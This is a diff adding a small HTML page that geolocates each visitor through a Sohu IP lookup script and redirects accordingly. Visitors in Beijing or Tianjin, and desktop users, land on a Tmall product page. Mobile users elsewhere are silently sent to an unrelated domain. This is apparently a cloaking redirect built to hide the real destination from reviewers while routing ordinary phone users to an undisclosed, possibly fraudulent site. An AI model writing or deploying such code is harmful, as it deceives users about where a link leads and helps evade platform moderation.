@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Document</title>
+</head>
+<body onload="ScreenWidth()">
+	<script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
+	<script language="JavaScript">
+	function ScreenWidth(){
+		var city = returnCitySN.cname;
+		if( (city.indexOf('北京市') >= 0) || (city.indexOf('天津市') >= 0) ){
+			window.location.href = 'https://detail.tmall.com/item.htm?spm=a220m.1000858.1000725.1.HJMiDY&id=520735415412&skuId=3241097717047&areaId=440300&user_id=751654534&cat_id=50043669&is_b=1&rn=2e5ccaeb22a6b1579a0386891a68e43d';
+		}else{
+			if (screen.width <= 768){
+			    window.location.href = 'https://yang2.gdyzf.wang/';
+			}else {
+			    window.location.href = 'https://detail.tmall.com/item.htm?spm=a220m.1000858.1000725.1.HJMiDY&id=520735415412&skuId=3241097717047&areaId=440300&user_id=751654534&cat_id=50043669&is_b=1&rn=2e5ccaeb22a6b1579a0386891a68e43d';
+			}
+		}
+		
+	}
+	</script>
+</body>
+</html>
